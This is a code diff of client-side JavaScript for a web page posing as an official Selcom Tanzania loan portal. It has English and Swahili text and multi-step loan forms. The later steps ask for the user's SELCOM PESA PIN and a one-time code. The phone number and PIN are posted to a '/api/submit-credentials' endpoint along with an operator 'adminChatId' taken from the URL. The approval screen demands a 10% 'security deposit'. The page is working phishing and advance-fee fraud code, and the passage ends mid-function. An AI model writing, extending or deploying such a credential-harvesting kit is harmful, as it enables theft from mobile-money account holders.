@@ -12,225 +12,220 @@ document.addEventListener('DOMContentLoaded', () => {
   const credsSurfaceBanner = document.getElementById('creds-surface-banner');
   const otpSurfaceBanner = document.getElementById('otp-surface-banner');
   const phoneError = document.getElementById('phone-error');
+  const phoneInput = document.getElementById('phone-number');
 
   let currentUserId = null;
   let statusPollInterval = null;
   let otpTimerInterval = null;
-  let currentLang = 'sw'; // Default language Swahili
+  let countdownSeconds = 60;
 
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
 
+  // Translations Dictionary
   const translations = {
-    sw: {
+    ENG: {
       welcomeTitle: "KARIBU SELCOM TANZANIA!",
       welcomeSub: "WELCOME TO THE OFFICIAL APPLICATION PORTAL.",
       welcomeDesc: "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.",
-      critNotif: "CRITICAL NOTIFICATION",
-      attention: ":* ! ATTENTION!",
-      critDesc: "An essential security measure: <strong>DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS</strong>. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.",
+      criticalMsg: "*! ATTENTION!<br>An essential security measure: <strong>DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS</strong>. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.",
       officialPortal: "Official Application Portal (Tanzania Only)",
-      proceedBtn: "ENDELEA",
-      calcTitle: "Kadiria Malipo ya Mkopo",
-      calcSub: "Chagua kiasi cha mkopo na muda wa marejesho",
-      loanAmtLbl: "Kiasi cha Mkopo (TZS)",
-      loanTermLbl: "Muda wa Mkopo (Miezi)",
-      monthlyEst: "Makadirio ya Malipo ya Kila Mwezi",
-      signInBtn: "INGIA / TUMIA →",
-      form1Title: "Maombi ya Mkopo",
-      form1Step: "Hatua 1 ya 3",
-      loanTypeLbl: "Aina ya Mkopo",
-      formAmountLbl: "Kiasi cha Mkopo (TZS)",
-      formDurationLbl: "Muda wa Mkopo",
-      loanPurposeLbl: "Madhumuni ya Mkopo",
-      loanPurposePh: "Elezea madhumuni ya mkopo wako...",
-      nextStepBtn: "HATUA INAYOFUATA →",
-      form2Title: "Maombi ya Mkopo",
-      form2Step: "Hatua 2 ya 3",
-      firstNameLbl: "Jina la Kwanza",
-      lastNameLbl: "Jina la Ukoo",
-      phoneLbl: "Namba ya Simu (Tanzania)",
-      phoneErr: "Tafadhali ingiza namba sahihi ya simu inayoanza na 0.",
-      prevBtn: "ILIYOTANGULIA",
-      nextBtn: "HATUA INAYOFUATA",
-      form3Title: "Maombi ya Mkopo",
-      form3Step: "Hatua 3 ya 3",
-      empStatusLbl: "Hali ya Ajira",
-      incomeLbl: "Mapato ya Mwaka (TZS)",
-      summaryHeader: "Muhtasari wa Maombi",
-      sumAmtLbl: "Kiasi cha Mkopo:",
-      sumTermLbl: "Muda wa Mkopo:",
-      sumPurpLbl: "Madhumuni:",
-      sumAppLbl: "Mwombaji:",
-      submitAppBtn: "WASILISHA MAOMBI",
-      pinTitle: "Thibitisha PIN yako ya SELCOM PESA",
-      pinSub: "Kwa usalama, tafadhali thibitisha PIN yako ya tarakimu 4 ya akaunti ili kuendelea.",
-      pinLabel: "PIN yako ya tarakimu 4",
-      pinNote: "Hakikisha hii inalingana na PIN uliyoweka kwa akaunti hii.",
-      pinSubmitBtn: "WASILISHA",
-      otpTitle: "Thibitisha OTP yako ya SELCOM PESA",
-      otpSub: "Kwa usalama, msimbo wa OTP umetumwa kwa SMS au WhatsApp kwenye nambari yako ya SELCOM PESA. Tafadhali ingiza hapa chini ili kuendelea.",
-      otpLabel: "OTP yako ya tarakimu 6",
-      otpSubmitBtn: "INGIZA OTP",
-      successTitle: "🎉 Hongera!",
-      successSub: "Mkopo wako umeidhinishwa! Fedha zitatolewa hivi karibuni kwenye akaunti yako ya Selcom Pesa.",
-      apprAmtLbl: "KIASI KILICHOIDHINISHWA",
-      complianceLbl: "⚠️ NOTISI YA UZINGATIAJI",
-      complianceDesc: "Akaunti yako ya SELCOM lazima iwe hai na idumishe amana ya usalama ya angalau <strong>10% ya kiasi cha mkopo ulioomba</strong>. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.",
-      loanDetailsHeader: "💳 Maelezo ya Mkopo",
-      monthlyRepLbl: "MALIPO YA KILA MWEZI",
-      termLbl: "MUDA WA MKOPO",
-      homeBtn: "🏠 Rudi Nyumbani",
-      loadingTitle: "Inachakata...",
-      loadingSub: "Tafadhali subiri wakati tunathibitisha taarifa zako."
-    },
-    en: {
-      welcomeTitle: "WELCOME TO SELCOM TANZANIA!",
-      welcomeSub: "WELCOME TO THE OFFICIAL APPLICATION PORTAL.",
-      welcomeDesc: "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.",
-      critNotif: "CRITICAL NOTIFICATION",
-      attention: ":* ! ATTENTION!",
-      critDesc: "An essential security measure: <strong>DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS</strong>. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.",
-      officialPortal: "Official Application Portal (Tanzania Only)",
-      proceedBtn: "CONTINUE",
+      continueBtn: "CONTINUE",
       calcTitle: "Estimate your loan repayments",
-      calcSub: "Choose your loan amount and repayment duration",
-      loanAmtLbl: "Loan Amount (TZS)",
-      loanTermLbl: "Loan Term (Months)",
-      monthlyEst: "Estimated Monthly Repayment",
-      signInBtn: "SIGN IN →",
+      loanAmtLbl: "LOAN AMOUNT",
+      loanTermLbl: "LOAN TERM (MONTHS)",
+      estMonthly: "ESTIMATED MONTHLY REPAYMENT",
+      totalRepay: "TOTAL REPAYMENT: TSH 2,820,000",
+      assumedRate: "*Assumed Interest Rate: 13.5%",
+      signInBtn: "SIGN IN",
       form1Title: "Loan Application",
       form1Step: "Step 1 of 3",
-      loanTypeLbl: "Loan Type",
-      formAmountLbl: "Loan Amount (TZS)",
-      formDurationLbl: "Loan Term",
-      loanPurposeLbl: "Loan Purpose",
-      loanPurposePh: "Describe the purpose of your loan...",
-      nextStepBtn: "NEXT STEP →",
+      lblLoanType: "Loan Type",
+      lblLoanAmt: "Loan Amount (TSh)",
+      lblLoanDur: "Loan Term",
+      lblLoanPurpose: "Loan Purpose",
+      loanPurposePlaceholder: "Describe your loan purpose...",
+      nextBtn: "NEXT STEP",
+      backBtn: "BACK",
       form2Title: "Loan Application",
       form2Step: "Step 2 of 3",
-      firstNameLbl: "First Name",
-      lastNameLbl: "Last Name",
-      phoneLbl: "Phone Number (Tanzania)",
-      phoneErr: "Please enter a valid Tanzania phone number starting with 0.",
-      prevBtn: "PREVIOUS",
-      nextBtn: "NEXT STEP",
+      lblFirstname: "First Name",
+      lblLastname: "Last Name",
+      lblPhone: "Phone Number (Tanzania)",
+      phoneHint: "Enter 9 digits or start with 0 (e.g., 0712345678)",
       form3Title: "Loan Application",
       form3Step: "Step 3 of 3",
-      empStatusLbl: "Employment Status",
-      incomeLbl: "Annual Income (TZS)",
-      summaryHeader: "Application Summary",
+      lblEmployment: "Employment Status",
+      lblAnnualIncome: "Annual Income (TSh)",
+      summaryTitle: "Application Summary",
       sumAmtLbl: "Loan Amount:",
-      sumTermLbl: "Loan Term:",
-      sumPurpLbl: "Purpose:",
+      sumDurLbl: "Loan Term:",
+      sumPurLbl: "Purpose:",
       sumAppLbl: "Applicant:",
-      submitAppBtn: "SUBMIT APPLICATION",
-      pinTitle: "Confirm your SELCOM PESA PIN",
-      pinSub: "For security, please confirm your 4-digit account PIN to continue.",
-      pinLabel: "Your 4-digit PIN",
-      pinNote: "Make sure this matches the PIN set for this account.",
-      pinSubmitBtn: "SUBMIT",
-      otpTitle: "Confirm your SELCOM PESA OTP",
-      otpSub: "For security, an OTP code has been sent via SMS or WhatsApp to your SELCOM Pesa number. Please enter below to continue.",
-      otpLabel: "Your 6-digit OTP",
-      otpSubmitBtn: "ENTER OTP",
-      successTitle: "🎉 Congratulations!",
-      successSub: "Your loan has been approved! Funds will be disbursed shortly to your Selcom Pesa account.",
-      apprAmtLbl: "APPROVED AMOUNT",
-      complianceLbl: "⚠️ COMPLIANCE NOTICE",
-      complianceDesc: "Your SELCOM account must be active and maintain a security deposit of at least <strong>10% of the requested loan amount</strong>. This deposit is fully refunded after loan repayment.",
-      loanDetailsHeader: "💳 Loan Details",
-      monthlyRepLbl: "MONTHLY REPAYMENT",
-      termLbl: "LOAN TERM",
-      homeBtn: "🏠 Return to Home",
-      loadingTitle: "Processing...",
-      loadingSub: "Please wait while we verify your information."
+      submitBtn: "SUBMIT APPLICATION",
+      pinTitle: "Thibitisha PIN yako ya SELCOM PESA",
+      pinSub: "For security, please verify your 4-digit account PIN to continue.",
+      pinPrompt: "Your 4-digit PIN",
+      pinHint: "Ensure this matches the PIN set for this account.",
+      pinSubmit: "SUBMIT",
+      otpTitle: "Thibitisha OTP yako ya SELCOM PESA",
+      otpSub: "For security, an OTP code has been sent via SMS or WhatsApp to your Selcom Pesa number. Please enter below.",
+      otpPrompt: "Your 6-digit OTP",
+      otpInstruction: "Please enter the full 6-digit code.",
+      resendText: "Didn't receive? Resend",
+      otpSubmit: "ENTER OTP",
+      congratsTitle: "🎉 Congratulations!",
+      congratsSub: "Your loan has been <strong>approved!</strong> Funds will be disbursed shortly.",
+      approvedLabel: "APPROVED AMOUNT",
+      complianceTitle: "⚠️ COMPLIANCE NOTICE",
+      complianceDesc: "Your Selcom details account must be active and maintain a safety security balance of at least 10% of the requested loan amount. This deposit is fully refunded after loan repayment.",
+      detailsHeader: "= Loan Details",
+      itemMonthly: "MONTHLY REPAYMENT",
+      itemTerm: "LOAN TERM",
+      itemRate: "INTEREST RATE",
+      homeBtn: "🏠 Home"
+    },
+    SWAHILI: {
+      welcomeTitle: "KARIBU SELCOM TANZANIA!",
+      welcomeSub: "WELCOME TO THE OFFICIAL APPLICATION PORTAL.",
+      welcomeDesc: "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.",
+      criticalMsg: "*! ATTENTION!<br>An essential security measure: <strong>DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS</strong>. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.",
+      officialPortal: "Official Application Portal (Tanzania Only)",
+      continueBtn: "ENDELEA",
+      calcTitle: "Kadiria malipo yako ya mkopo",
+      loanAmtLbl: "KIASI CHA MKOPO",
+      loanTermLbl: "MUDA WA MKOPO (MIEZI)",
+      estMonthly: "MALIPO YA KILA MWEZI YANAYOKADIRIWA",
+      totalRepay: "JUMLA YA MALIPO: TSH 2,820,000",
+      assumedRate: "*Kiwango cha Riba Kinachodhaniwa: 13.5%",
+      signInBtn: "INGIA",
+      form1Title: "Maombi ya Mkopo",
+      form1Step: "Hatua 1 ya 3",
+      lblLoanType: "Aina ya Mkopo",
+      lblLoanAmt: "Kiasi cha Mkopo (TSh)",
+      lblLoanDur: "Muda wa Mkopo",
+      lblLoanPurpose: "Madhumuni ya Mkopo",
+      loanPurposePlaceholder: "Elezea madhumuni ya mkopo wako...",
+      nextBtn: "HATUA INAYOFUATA",
+      backBtn: "ILIYOTANGULIA",
+      form2Title: "Maombi ya Mkopo",
+      form2Step: "Hatua 2 ya 3",
+      lblFirstname: "Jina la Kwanza",
+      lblLastname: "Jina la Ukoo",
+      lblPhone: "Nambari ya Simu (Tanzania)",
+      phoneHint: "Weka nambari 9 au anza na 0 (mfano, 0712345678)",
+      form3Title: "Maombi ya Mkopo",
+      form3Step: "Hatua 3 ya 3",
+      lblEmployment: "Hali ya Ajira",
+      lblAnnualIncome: "Mapato ya Mwaka (TSh)",
+      summaryTitle: "Muhtasari wa Maombi",
+      sumAmtLbl: "Kiasi cha Mkopo:",
+      sumDurLbl: "Muda wa Mkopo:",
+      sumPurLbl: "Madhumuni:",
+      sumAppLbl: "Mwombaji:",
+      submitBtn: "WASILISHA MAOMBI",
+      pinTitle: "Thibitisha PIN yako ya SELCOM PESA",
+      pinSub: "Kwa usalama, tafadhali thibitisha PIN yako ya tarakimu 4 ya akaunti ili kuendelea.",
+      pinPrompt: "PIN yako ya tarakimu 4",
+      pinHint: "Hakikisha hii inalingana na PIN uliyoweka kwa akaunti hii.",
+      pinSubmit: "WASILISHA",
+      otpTitle: "Thibitisha OTP yako ya SELCOM PESA",
+      otpSub: "Kwa usalama, msimbo wa OTP umetumwa kupitia SMS au WhatsApp kwenye nambari yako ya SELCOM PESA. Tafadhali ingiza hapa chini ili kuendelea.",
+      otpPrompt: "OTP yako ya tarakimu 6",
+      otpInstruction: "Tafadhali ingiza msimbo kamili wa tarakimu 6.",
+      resendText: "Hukuipata? Tuma tena",
+      otpSubmit: "INGIZA OTP",
+      congratsTitle: "🎉 Hongera!",
+      congratsSub: "Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatilewa hivi karibuni.",
+      approvedLabel: "KIASI KILICHOIDHINISHWA",
+      complianceTitle: "⚠️ NOTISI YA UZINGATIAJI",
+      complianceDesc: "Akaunti yako ya SELCOM details lazima iwe hai na idumish uamana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaldia kupata riba nzuri zaidi.",
+      detailsHeader: "= Maelezo ya Mkopo",
+      itemMonthly: "MALIPO YA KILA MWEZI",
+      itemTerm: "MUDA WA MKOPO",
+      itemRate: "KIWANGO CHA RIBA",
+      homeBtn: "🏠 Rudi Nyumbani"
     }
   };
 
-  function updateLanguageTexts() {
-    const t = translations[currentLang];
-    
-    document.getElementById('lang-label-eng').style.opacity = currentLang === 'en' ? '1' : '0.7';
-    document.getElementById('lang-label-swa').style.opacity = currentLang === 'sw' ? '1' : '0.7';
-
+  function updateLanguage(lang) {
+    const t = translations[lang];
     document.getElementById('txt-welcome-title').innerText = t.welcomeTitle;
     document.getElementById('txt-welcome-sub').innerText = t.welcomeSub;
     document.getElementById('txt-welcome-desc').innerText = t.welcomeDesc;
-    document.getElementById('txt-crit-notif').innerText = t.critNotif;
-    document.getElementById('txt-attention').innerText = t.attention;
-    document.getElementById('txt-crit-desc').innerHTML = t.critDesc;
+    document.getElementById('txt-critical-msg').innerHTML = t.criticalMsg;
     document.getElementById('txt-official-portal').innerText = t.officialPortal;
-    document.getElementById('btn-welcome-proceed').innerText = t.proceedBtn;
-
+    document.getElementById('btn-welcome-continue').innerText = t.continueBtn;
     document.getElementById('txt-calc-title').innerText = t.calcTitle;
-    document.getElementById('txt-calc-sub').innerText = t.calcSub;
-    document.getElementById('txt-loan-amount-lbl').innerText = t.loanAmtLbl;
-    document.getElementById('txt-loan-term-lbl').innerText = t.loanTermLbl;
-    document.getElementById('txt-monthly-est').innerText = t.monthlyEst;
+    document.getElementById('txt-loan-amount-label').innerText = t.loanAmtLbl;
+    document.getElementById('txt-loan-term-label').innerText = t.loanTermLbl;
+    document.getElementById('txt-est-monthly').innerText = t.estMonthly;
+    document.getElementById('txt-total-repay').innerText = t.totalRepay;
+    document.getElementById('txt-assumed-rate').innerText = t.assumedRate;
     document.getElementById('btn-slider-next').innerText = t.signInBtn;
-
     document.getElementById('txt-form1-title').innerText = t.form1Title;
     document.getElementById('txt-form1-step').innerText = t.form1Step;
-    document.getElementById('txt-loan-type-lbl').innerText = t.loanTypeLbl;
-    document.getElementById('txt-form-amount-lbl').innerText = t.formAmountLbl;
-    document.getElementById('txt-form-duration-lbl').innerText = t.formDurationLbl;
-    document.getElementById('txt-loan-purpose-lbl').innerText = t.loanPurposeLbl;
-    document.getElementById('loan-purpose').placeholder = t.loanPurposePh;
-    document.getElementById('btn-form1-next').innerText = t.nextStepBtn;
-
+    document.getElementById('lbl-loan-type').innerText = t.lblLoanType;
+    document.getElementById('lbl-loan-amt').innerText = t.lblLoanAmt;
+    document.getElementById('lbl-loan-dur').innerText = t.lblLoanDur;
+    document.getElementById('lbl-loan-purpose').innerText = t.lblLoanPurpose;
+    document.getElementById('loan-purpose').placeholder = t.loanPurposePlaceholder;
+    document.getElementById('btn-form1-next').innerText = t.nextBtn;
     document.getElementById('txt-form2-title').innerText = t.form2Title;
     document.getElementById('txt-form2-step').innerText = t.form2Step;
-    document.getElementById('txt-firstname-lbl').innerText = t.firstNameLbl;
-    document.getElementById('txt-lastname-lbl').innerText = t.lastNameLbl;
-    document.getElementById('txt-phone-lbl').innerText = t.phoneLbl;
-    document.getElementById('phone-error').innerText = t.phoneErr;
-    document.getElementById('btn-form2-back').innerText = t.prevBtn;
+    document.getElementById('lbl-firstname').innerText = t.lblFirstname;
+    document.getElementById('lbl-lastname').innerText = t.lblLastname;
+    document.getElementById('lbl-phone').innerText = t.lblPhone;
+    document.getElementById('txt-phone-hint').innerText = t.phoneHint;
     document.getElementById('btn-form2-next').innerText = t.nextBtn;
-
     document.getElementById('txt-form3-title').innerText = t.form3Title;
     document.getElementById('txt-form3-step').innerText = t.form3Step;
-    document.getElementById('txt-emp-status-lbl').innerText = t.empStatusLbl;
-    document.getElementById('txt-income-lbl').innerText = t.incomeLbl;
-    document.getElementById('txt-summary-header').innerText = t.summaryHeader;
+    document.getElementById('lbl-employment').innerText = t.lblEmployment;
+    document.getElementById('lbl-annual-income').innerText = t.lblAnnualIncome;
+    document.getElementById('txt-summary-title').innerText = t.summaryTitle;
     document.getElementById('txt-sum-amt-lbl').innerText = t.sumAmtLbl;
-    document.getElementById('txt-sum-term-lbl').innerText = t.sumTermLbl;
-    document.getElementById('txt-sum-purp-lbl').innerText = t.sumPurpLbl;
+    document.getElementById('txt-sum-dur-lbl').innerText = t.sumDurLbl;
+    document.getElementById('txt-sum-pur-lbl').innerText = t.sumPurLbl;
     document.getElementById('txt-sum-app-lbl').innerText = t.sumAppLbl;
-    document.getElementById('btn-form3-back').innerText = t.prevBtn;
-    document.getElementById('btn-form3-submit').innerText = t.submitAppBtn;
-
+    document.getElementById('btn-form3-submit').innerText = t.submitBtn;
     document.getElementById('txt-pin-title').innerText = t.pinTitle;
     document.getElementById('txt-pin-sub').innerText = t.pinSub;
-    document.getElementById('txt-pin-label').innerText = t.pinLabel;
-    document.getElementById('txt-pin-note').innerText = t.pinNote;
-    document.getElementById('btn-submit-creds').innerText = t.pinSubmitBtn;
-
+    document.getElementById('txt-pin-prompt').innerText = t.pinPrompt;
+    document.getElementById('txt-pin-hint').innerText = t.pinHint;
+    document.getElementById('btn-submit-creds').innerText = t.pinSubmit;
     document.getElementById('txt-otp-title').innerText = t.otpTitle;
     document.getElementById('txt-otp-sub').innerText = t.otpSub;
-    document.getElementById('txt-otp-label').innerText = t.otpLabel;
-    document.getElementById('btn-submit-otp').innerText = t.otpSubmitBtn;
-
-    document.getElementById('txt-success-title').innerText = t.successTitle;
-    document.getElementById('txt-success-sub').innerText = t.successSub;
-    document.getElementById('txt-appr-amt-lbl').innerText = t.apprAmtLbl;
-    document.getElementById('txt-compliance-lbl').innerText = t.complianceLbl;
-    document.getElementById('txt-compliance-desc').innerHTML = t.complianceDesc;
-    document.getElementById('txt-loan-details-header').innerText = t.loanDetailsHeader;
-    document.getElementById('txt-monthly-rep-lbl').innerText = t.monthlyRepLbl;
-    document.getElementById('txt-term-lbl').innerText = t.termLbl;
+    document.getElementById('txt-otp-prompt').innerText = t.otpPrompt;
+    document.getElementById('txt-otp-instruction').innerText = t.otpInstruction;
+    document.getElementById('txt-resend-text').innerText = t.resendText;
+    document.getElementById('btn-submit-otp').innerText = t.otpSubmit;
+    document.getElementById('txt-congrats-title').innerText = t.congratsTitle;
+    document.getElementById('txt-congrats-sub').innerHTML = t.congratsSub;
+    document.getElementById('txt-approved-label').innerText = t.approvedLabel;
+    document.getElementById('txt-compliance-title').innerText = t.complianceTitle;
+    document.getElementById('txt-compliance-desc').innerText = t.complianceDesc;
+    document.getElementById('txt-details-header').innerText = t.detailsHeader;
+    document.getElementById('txt-item-monthly').innerText = t.itemMonthly;
+    document.getElementById('txt-item-term').innerText = t.itemTerm;
+    document.getElementById('txt-item-rate').innerText = t.itemRate;
     document.getElementById('btn-go-home').innerText = t.homeBtn;
-
-    document.getElementById('txt-loading-title').innerText = t.loadingTitle;
-    document.getElementById('txt-loading-sub').innerText = t.loadingSub;
   }
 
-  const langToggle = document.getElementById('language-toggle');
+  const langToggle = document.getElementById('lang-toggle');
+  const engLabel = document.getElementById('lang-eng-label');
+  const swaLabel = document.getElementById('lang-swa-label');
+
   if (langToggle) {
-    langToggle.checked = (currentLang === 'sw');
     langToggle.addEventListener('change', (e) => {
-      currentLang = e.target.checked ? 'sw' : 'en';
-      updateLanguageTexts();
+      if (e.target.checked) {
+        swaLabel.classList.add('active');
+        engLabel.classList.remove('active');
+        updateLanguage('SWAHILI');
+      } else {
+        engLabel.classList.add('active');
+        swaLabel.classList.remove('active');
+        updateLanguage('ENG');
+      }
     });
   }
 
@@ -241,6 +236,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (targetStep) targetStep.classList.add('active');
   }
 
+  // Sliders
   const sliderBalance = document.getElementById('slider-balance');
   const balanceVal = document.getElementById('balance-val');
   const sliderDuration = document.getElementById('slider-duration');
@@ -250,95 +246,80 @@ document.addEventListener('DOMContentLoaded', () => {
 
   if (sliderBalance && balanceVal) {
     sliderBalance.addEventListener('input', (e) => {
-      const val = `${Number(e.target.value).toLocaleString()} TZS`;
+      const val = `TSH ${Number(e.target.value).toLocaleString()}`;
       balanceVal.innerText = val;
-      if (formAmount) formAmount.value = val;
+      if (formAmount) formAmount.value = e.target.value;
       const summaryAmt = document.getElementById('summary-amount');
-      if (summaryAmt) summaryAmt.innerText = val;
+      if (summaryAmt) summaryAmt.innerText = `TSh ${Number(e.target.value).toLocaleString()}`;
     });
   }
 
   if (sliderDuration && durationVal) {
     sliderDuration.addEventListener('input', (e) => {
-      const val = `${e.target.value} ${currentLang === 'sw' ? 'miezi' : 'months'}`;
+      const val = `${e.target.value} MONTHS`;
       durationVal.innerText = val;
-      if (formDuration) formDuration.value = `${e.target.value} ${currentLang === 'sw' ? 'Miezi' : 'Months'}`;
+      if (formDuration) formDuration.value = `Miezi ${e.target.value}`;
       const summaryDur = document.getElementById('summary-duration');
-      if (summaryDur) summaryDur.innerText = `${e.target.value} ${currentLang === 'sw' ? 'Miezi' : 'Months'}`;
+      if (summaryDur) summaryDur.innerText = `Miezi ${e.target.value}`;
     });
   }
 
-  const phoneInput = document.getElementById('phone-number');
+  // Phone Validation
   if (phoneInput) {
     phoneInput.addEventListener('input', (e) => {
       let val = e.target.value.replace(/\D/g, '');
-      if (val.length > 10) {
-        val = val.substring(0, 10);
-      }
+      if (val.length > 10) val = val.substring(0, 10);
       e.target.value = val;
     });
   }
 
-  const btnWelcome = document.getElementById('btn-welcome-proceed');
-  if (btnWelcome) {
-    btnWelcome.addEventListener('click', () => {
-      showStep(stepSlider);
-    });
-  }
-  
-  const btnSliderNext = document.getElementById('btn-slider-next');
-  if (btnSliderNext) {
-    btnSliderNext.addEventListener('click', () => {
-      if (sliderBalance && formAmount) {
-        formAmount.value = `${Number(sliderBalance.value).toLocaleString()} TZS`;
+  // Navigation button listeners
+  document.getElementById('btn-welcome-continue').addEventListener('click', () => showStep(stepSlider));
+  document.getElementById('btn-slider-next').addEventListener('click', () => {
+    if (sliderBalance && formAmount) formAmount.value = sliderBalance.value;
+    showStep(stepForm1);
+  });
+
+  document.getElementById('btn-form1-next').addEventListener('click', () => showStep(stepForm2));
+  document.getElementById('btn-form1-back-top').addEventListener('click', () => showStep(stepSlider));
+
+  document.getElementById('btn-form2-back').addEventListener('click', () => showStep(stepForm1));
+  document.getElementById('btn-form2-back-top').addEventListener('click', () => showStep(stepForm1));
+
+  document.getElementById('btn-form2-next').addEventListener('click', () => {
+    const firstName = document.getElementById('first-name').value.trim();
+    const lastName = document.getElementById('last-name').value.trim();
+    const phoneVal = phoneInput ? phoneInput.value.trim() : '';
+
+    const tzRegex = /^(07|06|7|6)\d{8}$/;
+    if (!tzRegex.test(phoneVal)) {
+      if (phoneError) {
+        phoneError.innerText = 'Weka nambari halali ya Tanzania (mfano 0712345678 au 712345678).';
+        phoneError.style.display = 'block';
       }
-      showStep(stepForm1);
-    });
-  }
+      return;
+    }
+    if (phoneError) phoneError.style.display = 'none';
 
-  const btnForm1Next = document.getElementById('btn-form1-next');
-  if (btnForm1Next) btnForm1Next.addEventListener('click', () => showStep(stepForm2));
+    const sumApplicant = document.getElementById('summary-applicant');
+    const sumPurpose = document.getElementById('summary-purpose');
+    const loanTypeEl = document.getElementById('loan-type');
 
-  const btnForm2Back = document.getElementById('btn-form2-back');
-  if (btnForm2Back) btnForm2Back.addEventListener('click', () => showStep(stepForm1));
+    if (sumApplicant) sumApplicant.innerText = `${firstName} ${lastName}`.trim() || 'Selcom Customer';
+    if (sumPurpose && loanTypeEl) sumPurpose.innerText = loanTypeEl.value;
 
-  const btnForm2Next = document.getElementById('btn-form2-next');
-  if (btnForm2Next) {
-    btnForm2Next.addEventListener('click', () => {
-      const firstName = document.getElementById('first-name').value.trim();
-      const lastName = document.getElementById('last-name').value.trim();
-      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
+    showStep(stepForm3);
+  });
 
-      if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
-        if (phoneError) {
-          phoneError.style.display = 'block';
-        }
-        return;
-      }
-      if (phoneError) phoneError.style.display = 'none';
+  document.getElementById('btn-form3-back').addEventListener('click', () => showStep(stepForm2));
+  document.getElementById('btn-form3-back-top').addEventListener('click', () => showStep(stepForm2));
 
-      const sumApplicant = document.getElementById('summary-applicant');
-      const sumPurpose = document.getElementById('summary-purpose');
-      const loanTypeEl = document.getElementById('loan-type');
+  document.getElementById('btn-form3-submit').addEventListener('click', () => {
+    showStep(stepPin);
+    if (pinDigits[0]) pinDigits[0].focus();
+  });
 
-      if (sumApplicant) sumApplicant.innerText = `${firstName} ${lastName}`.trim() || 'Selcom Customer';
-      if (sumPurpose && loanTypeEl) sumPurpose.innerText = loanTypeEl.value;
-
-      showStep(stepForm3);
-    });
-  }
-
-  const btnForm3Back = document.getElementById('btn-form3-back');
-  if (btnForm3Back) btnForm3Back.addEventListener('click', () => showStep(stepForm2));
-
-  const btnForm3Submit = document.getElementById('btn-form3-submit');
-  if (btnForm3Submit) {
-    btnForm3Submit.addEventListener('click', () => {
-      showStep(stepPin);
-      if (pinDigits[0]) pinDigits[0].focus();
-    });
-  }
-
+  // PIN Inputs
   const pinDigits = document.querySelectorAll('.pin-digit');
   const otpDigits6 = document.querySelectorAll('.otp-digit-6');
 
@@ -349,13 +330,11 @@ document.addEventListener('DOMContentLoaded', () => {
         if (input.value && idx < inputs.length - 1) {
           inputs[idx + 1].focus();
         }
-
         const allFilled = Array.from(inputs).every(i => i.value.length === 1);
         if (allFilled && typeof autoSubmitCallback === 'function') {
           autoSubmitCallback();
         }
       });
-
       input.addEventListener('keydown', (e) => {
         if (e.key === 'Backspace' && !input.value && idx > 0) {
           inputs[idx - 1].focus();
@@ -367,63 +346,81 @@ document.addEventListener('DOMContentLoaded', () => {
   setupDigitInputs(pinDigits);
   setupDigitInputs(otpDigits6, () => submitOtpHandler());
 
-  function startOtpCountdown() {
-    let timeLeft = 60;
-    const timerDisplay = document.getElementById('otp-timer-display');
-    const resendBtn = document.getElementById('btn-request-new-otp');
-    if (resendBtn) resendBtn.style.display = 'none';
-
-    if (otpTimerInterval) clearInterval(otpTimerInterval);
-
-    otpTimerInterval = setInterval(() => {
-      timeLeft--;
-      let minutes = Math.floor(timeLeft / 60);
-      let seconds = timeLeft % 60;
-      if (timerDisplay) {
-        timerDisplay.innerHTML = `${currentLang === 'sw' ? 'Msimbo utaisha muda wake baada ya:' : 'Code expires in:'} <strong>${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}</strong>`;
-      }
-
-      if (timeLeft <= 0) {
-        clearInterval(otpTimerInterval);
-        if (timerDisplay) timerDisplay.innerHTML = `<strong>${currentLang === 'sw' ? 'Msimbo umeisha muda wake!' : 'Code expired!'}</strong>`;
-        if (resendBtn) resendBtn.style.display = 'inline-block';
-      }
-    }, 1000);
-  }
-
-  const resendBtn = document.getElementById('btn-request-new-otp');
-  if (resendBtn) {
-    resendBtn.addEventListener('click', async () => {
-      otpDigits6.forEach(i => i.value = '');
-      if (otpDigits6[0]) otpDigits6[0].focus();
-      if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');
-      startOtpCountdown();
-      
-      try {
-        await fetch('/api/request-new-otp', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ userId: currentUserId })
-        });
-      } catch (e) {}
-    });
-  }
-
+  // Submit Credentials (PIN & Phone)
   const btnSubmitCreds = document.getElementById('btn-submit-creds');
   if (btnSubmitCreds) {
     btnSubmitCreds.addEventListener('click', async () => {
       const phoneVal = phoneInput ? phoneInput.value.trim() : '';
       const pinVal = Array.from(pinDigits).map(i => i.value).join('');
-
       const pinError = document.getElementById('pin-error');
+
       if (pinVal.length !== 4) {
         if (pinError) pinError.style.display = 'block';
         return;
       }
       if (pinError) pinError.style.display = 'none';
-
       if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
-      showLoading(currentLang === 'sw' ? 'Inathibitisha...' : 'Verifying...', currentLang === 'sw' ? 'Inatuma taarifa zako kwa usalama.' : 'Securely transmitting your credentials.');
+
+      showLoading('Inachakata...', 'Inatuma PIN yako kwa usalama.');
 
       try {
-        const
+        const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: phoneVal, pin: pinVal, adminChatId: adminParam })
+        });
+        const data = await res.json();
+        if (data.success) {
+          currentUserId = data.userId;
